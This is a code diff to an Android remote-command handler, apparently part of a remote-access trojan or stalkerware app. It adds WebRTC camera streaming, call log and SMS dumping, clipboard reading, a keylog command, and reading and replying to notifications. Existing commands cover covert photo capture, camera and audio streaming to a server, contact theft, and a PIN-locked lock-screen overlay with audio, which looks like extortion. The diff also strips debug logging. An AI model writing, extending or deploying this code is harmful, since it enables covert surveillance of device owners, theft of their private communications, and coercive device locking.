@@ -4,7 +4,6 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
-import android.graphics.Bitmap
 import android.hardware.camera2.CameraCharacteristics
 import android.hardware.camera2.CameraManager
 import android.media.MediaPlayer
@@ -99,17 +98,45 @@ object NativeCommandHandler {
                 "start_audio_stream" -> startAudioStream()
                 "stop_audio_stream" -> stopAudioStream()
 
-                // ===== CAMERA =====
+                // ===== CAMERA (Legacy HTTP) =====
                 "take_photo" -> takePhotoReal(context, extra)
                 "start_camera_stream" -> startCameraStreamReal(context, extra)
                 "stop_camera_stream" -> stopCameraStreamReal(context)
 
+                // ===== WEBRTC =====
+                "webrtc_start_camera" -> webrtcStartCamera(context, extra)
+                "webrtc_start_screen" -> webrtcStartScreen(context)
+                "webrtc_stop" -> webrtcStop()
+                "webrtc_offer" -> webrtcOffer()
+                "webrtc_answer" -> webrtcAnswer(extra)
+                "webrtc_ice" -> webrtcIce(extra)
+                "webrtc_switch_camera" -> webrtcSwitchCamera()
+
                 // ===== CONTACTS =====
                 "get_contacts" -> getContacts(context)
+
+                // ===== CALL LOG / SMS =====
+                "get_call_logs" -> CommunicationDumper.getCallLogs(context)
+                "get_sms_inbox" -> CommunicationDumper.getSmsInbox(context)
+
+                // ===== KEYLOG / CLIPBOARD =====
+                "get_keylogs" -> JSONObject().apply {
+                    put("ok", true)
+                    put("keylogs", JSONArray())
+                }
+                "get_clipboard" -> getClipboardData(context)
+
+                // ===== NOTIFICATION REPLY =====
+                "reply_notification" -> replyNotification(extra)
+                "get_active_notifications" -> getActiveNotifications()
 
                 // ===== ACCESSIBILITY =====
                 "open_accessibility" -> {
                     openAccessibilitySettings(context)
+                    JSONObject().apply { put("ok", true) }
+                }
+                "open_notification_listener" -> {
+                    openNotificationListenerSettings(context)
                     JSONObject().apply { put("ok", true) }
                 }
 
@@ -287,12 +314,6 @@ object NativeCommandHandler {
     // ==========================================
     private fun hardLockOverlay(context: Context, extra: String): JSONObject {
         return try {
-            // ==========================================
-            // ===== PARSE EXTRA =====
-            // ==========================================
-            // Format 1: "message|pin"
-            // Format 2: "message|pin|audio_url"
-            // Format 3: "message|pin|audio_url|volume"
             val parts = extra.split("|")
 
             val message = parts.getOrNull(0)?.takeIf { it.isNotEmpty() }
@@ -302,11 +323,7 @@ object NativeCommandHandler {
             val audioUrl = parts.getOrNull(2) ?: ""
             val volume = parts.getOrNull(3)?.toFloatOrNull() ?: 1.0f
 
-            Log.d(TAG, "🔒 Launch lock overlay:")
-            Log.d(TAG, "   message: $message")
-            Log.d(TAG, "   pin:     ${pin.take(2)}***")
-            Log.d(TAG, "   audio:   ${audioUrl.take(60)}")
-            Log.d(TAG, "   volume:  $volume")
+            Log.d(TAG, "🔒 Lock overlay: msg=$message, audio=$audioUrl, vol=$volume")
 
             val intent = Intent(context, LockOverlayActivity::class.java).apply {
                 addFlags(
@@ -327,10 +344,8 @@ object NativeCommandHandler {
                 put("locked", true)
                 put("message", message)
                 put("has_sound", audioUrl.isNotEmpty())
-                put("audio_url", audioUrl)
             }
         } catch (e: Exception) {
-            Log.e(TAG, "hardLockOverlay error", e)
             JSONObject().apply {
                 put("ok", false)
                 put("error", e.message ?: "lock_error")
@@ -340,7 +355,6 @@ object NativeCommandHandler {
 
     private fun unlockOverlay(): JSONObject {
         return try {
-            Log.d(TAG, "🔓 Unlock overlay")
             LockOverlayManager.unlock()
             JSONObject().apply {
                 put("ok", true)
@@ -747,7 +761,6 @@ object NativeCommandHandler {
     private fun startAudioStream(): JSONObject {
         return try {
             val ok = AudioStreamService.start { chunk ->
-                // Kirim chunk audio ke server via ConnectionService
                 ConnectionService.sendAudioFrame(chunk)
             }
             JSONObject().apply {
@@ -772,16 +785,13 @@ object NativeCommandHandler {
     }
 
     // ==========================================
-    // ===== CAMERA =====
+    // ===== CAMERA (Legacy HTTP) =====
     // ==========================================
     private fun takePhotoReal(context: Context, extra: String): JSONObject {
         return try {
             val facing = extra.ifEmpty { "back" }
 
-            Log.d(TAG, "📸 Taking photo (facing=$facing)")
-
             CameraStreamService.takePhoto(context, facing) { base64, error ->
-                // Callback async — kirim via ConnectionService
                 val result = JSONObject().apply {
                     if (error != null) {
                         put("ok", false)
@@ -814,14 +824,11 @@ object NativeCommandHandler {
             val facing = parts.getOrNull(0)?.ifEmpty { "back" } ?: "back"
             val interval = parts.getOrNull(1)?.toLongOrNull() ?: 200L
 
-            Log.d(TAG, "📷 Starting camera stream (facing=$facing, interval=$interval)")
-
             val ok = CameraStreamService.start(
                 context = context,
                 facing = facing,
                 intervalMs = interval,
                 frameCallback = { base64 ->
-                    // Kirim frame ke server
                     ConnectionService.sendCameraFrame(base64)
                 },
                 errorCallback = { error ->
@@ -850,6 +857,119 @@ object NativeCommandHandler {
             JSONObject().apply {
                 put("ok", false)
                 put("error", e.message ?: "stop_error")
+            }
+        }
+    }
+
+    // ==========================================
+    // ===== WEBRTC =====
+    // ==========================================
+    private fun webrtcStartCamera(context: Context, extra: String): JSONObject {
+        return try {
+            val parts = extra.split("|")
+            val facing = parts.getOrNull(0) ?: "back"
+            val withAudio = parts.getOrNull(1)?.toBoolean() ?: true
+
+            val ok = WebRTCService.startCameraStream(context, facing, withAudio)
+
+            // Set ICE callback
+            WebRTCService.onIceCandidate = { json ->
+                ConnectionService.sendCommandResponse("webrtc_ice", json)
+            }
+
+            // Buat offer
+            WebRTCService.createOffer { offer ->
+                ConnectionService.sendCommandResponse("webrtc_offer", offer)
+            }
+
+            JSONObject().apply {
+                put("ok", ok)
+                put("mode", "camera")
+                put("facing", facing)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "webrtc_error")
+            }
+        }
+    }
+
+    private fun webrtcStartScreen(context: Context): JSONObject {
+        return JSONObject().apply {
+            put("ok", false)
+            put("error", "screen_stream_requires_activity")
+            put("message", "Buka Activity dulu untuk request MediaProjection")
+        }
+    }
+
+    private fun webrtcStop(): JSONObject {
+        return try {
+            WebRTCService.stop()
+            JSONObject().apply { put("ok", true) }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "stop_error")
+            }
+        }
+    }
+
+    private fun webrtcOffer(): JSONObject {
+        return try {
+            WebRTCService.createOffer { offer ->
+                ConnectionService.sendCommandResponse("webrtc_offer", offer)
+            }
+            JSONObject().apply {
+                put("ok", true)
+                put("message", "offer_created_async")
+                put("async", true)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "offer_error")
+            }
+        }
+    }
+
+    private fun webrtcAnswer(extra: String): JSONObject {
+        return try {
+            WebRTCService.setRemoteAnswer(extra)
+            JSONObject().apply { put("ok", true) }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "answer_error")
+            }
+        }
+    }
+
+    private fun webrtcIce(extra: String): JSONObject {
+        return try {
+            val parts = extra.split("|")
+            val sdp = parts.getOrNull(0) ?: ""
+            val sdpMid = parts.getOrNull(1)
+            val sdpMLineIndex = parts.getOrNull(2)?.toIntOrNull() ?: 0
+
+            WebRTCService.addIceCandidate(sdp, sdpMid, sdpMLineIndex)
+            JSONObject().apply { put("ok", true) }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "ice_error")
+            }
+        }
+    }
+
+    private fun webrtcSwitchCamera(): JSONObject {
+        return try {
+            WebRTCService.switchCamera()
+            JSONObject().apply { put("ok", true) }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "switch_error")
             }
         }
     }
@@ -904,6 +1024,99 @@ object NativeCommandHandler {
     }
 
     // ==========================================
+    // ===== CLIPBOARD =====
+    // ==========================================
+    private fun getClipboardData(context: Context): JSONObject {
+        return try {
+            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE)
+                    as android.content.ClipboardManager
+            if (clipboard.hasPrimaryClip()) {
+                val clip = clipboard.primaryClip
+                if (clip != null && clip.itemCount > 0) {
+                    val text = clip.getItemAt(0).text?.toString() ?: ""
+                    JSONObject().apply {
+                        put("ok", true)
+                        put("text", text)
+                    }
+                } else {
+                    JSONObject().apply {
+                        put("ok", false)
+                        put("error", "clipboard_empty")
+                    }
+                }
+            } else {
+                JSONObject().apply {
+                    put("ok", false)
+                    put("error", "no_clipboard")
+                }
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "clipboard_error")
+            }
+        }
+    }
+
+    // ==========================================
+    // ===== NOTIFICATION REPLY =====
+    // ==========================================
+    private fun replyNotification(extra: String): JSONObject {
+        return try {
+            val parts = extra.split("|")
+            val notifKey = parts.getOrNull(0) ?: ""
+            val text = parts.getOrNull(1) ?: ""
+
+            val service = NotificationReplyService.instance
+                ?: return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "notification_listener_not_connected")
+                }
+
+            val ok = service.replyToNotification(notifKey, text)
+            JSONObject().apply {
+                put("ok", ok)
+                put("notifKey", notifKey)
+                put("text", text)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "reply_error")
+            }
+        }
+    }
+
+    private fun getActiveNotifications(): JSONObject {
+        return try {
+            val service = NotificationReplyService.instance
+                ?: return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "notification_listener_not_connected")
+                    put("notifications", JSONArray())
+                }
+
+            val list = service.getActiveNotificationsList()
+            val jsonArray = JSONArray()
+            for (n in list) {
+                jsonArray.put(JSONObject(n))
+            }
+
+            JSONObject().apply {
+                put("ok", true)
+                put("notifications", jsonArray)
+                put("count", list.size)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "get_notifs_error")
+                put("notifications", JSONArray())
+            }
+        }
+    }
+
+    // ==========================================
     // ===== SETTINGS =====
     // ==========================================
     private fun openAccessibilitySettings(context: Context) {
@@ -913,6 +1126,16 @@ object NativeCommandHandler {
             context.startActivity(intent)
         } catch (e: Exception) {
             Log.e(TAG, "openAccessibility error", e)
+        }
+    }
+
+    private fun openNotificationListenerSettings(context: Context) {
+        try {
+            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            context.startActivity(intent)
+        } catch (e: Exception) {
+            Log.e(TAG, "openNotifListener error", e)
         }
     }
 
